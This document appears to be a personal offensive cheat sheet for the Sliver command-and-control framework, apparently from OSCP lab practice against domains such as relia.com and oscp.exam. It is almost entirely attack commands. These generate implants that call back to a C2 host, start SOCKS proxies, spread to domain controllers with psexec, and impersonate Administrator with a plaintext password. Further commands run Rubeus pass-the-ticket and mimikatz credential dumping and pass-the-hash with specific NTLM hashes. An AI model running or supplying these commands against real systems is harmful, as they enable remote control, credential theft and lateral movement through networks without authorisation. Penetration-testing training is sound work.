https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors

# Proxy
socks5 start -P 1080

# Beacons
generate beacon --http 192.168.45.235:8181 --format exe --skip-symbols

# Listeners
http -L 192.168.45.235 -l 8080

# Sessions
generate --http 192.168.45.235:8080 --format exe --skip-symbols

# Services
profiles new --format service --skip-symbols --mtls 192.168.45.235 win-svc64
psexec -d Description -s ServiceName -p win-svc64 LOGIN.relia.com
psexec -d Description -s testo -p win-svc64 DC02.relia.com

# Impersonate with credentials
make-token -u Administrator -p vau!XCKjNQBv2$ -d relia.com -T LOGON_INTERACTIVE

# PassTheHash (not yet ready)
.\Rubeus asktgt /user:dan /rc4:4b22394fc907bd7a74d1af6cc9aca348 /nowrap
.\Rubeus asktgs /ticket:sdfsdf= /service:cifs/dc02.relia.com /ptt

.\Rubeus.exe asktgt /domain:oscp.exam /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\ms02.oscp.exam cmd


.\Rubeus.exe asktgt /domain:relia.com /user:dan /rc4:4b22394fc907bd7a74d1af6cc9aca348 /ptt
.\PsExec.exe -accepteula \\\\DC02.relia.com cmd
sharpmapexec ntlm smb /user:dan /ntlm:4b22394fc907bd7a74d1af6cc9aca348 /domain:relia.com /computername:DC02

mimikatz -c '"sekurlsa::pth /user:dan /domain:relia.com /ntlm:4b22394fc907bd7a74d1af6cc9aca348 /run:powershell.exe"'
mimikatz "privilege::debug" "sekurlsa::pth /user:dan /domain:relia.com /ntlm:4b22394fc907bd7a74d1af6cc9aca348"

mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:cmd.exe"


execute -o mimikatz "privilege::debug" "sekurlsa::pth /user:dan /domain:relia.com /ntlm:4b22394fc907bd7a74d1af6cc9aca348 /run:cmd.exe"
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::pth /user:dan /domain:relia.com /ntlm:4b22394fc907bd7a74d1af6cc9aca348" "token::elevate /domain:relia.com /user:dan"

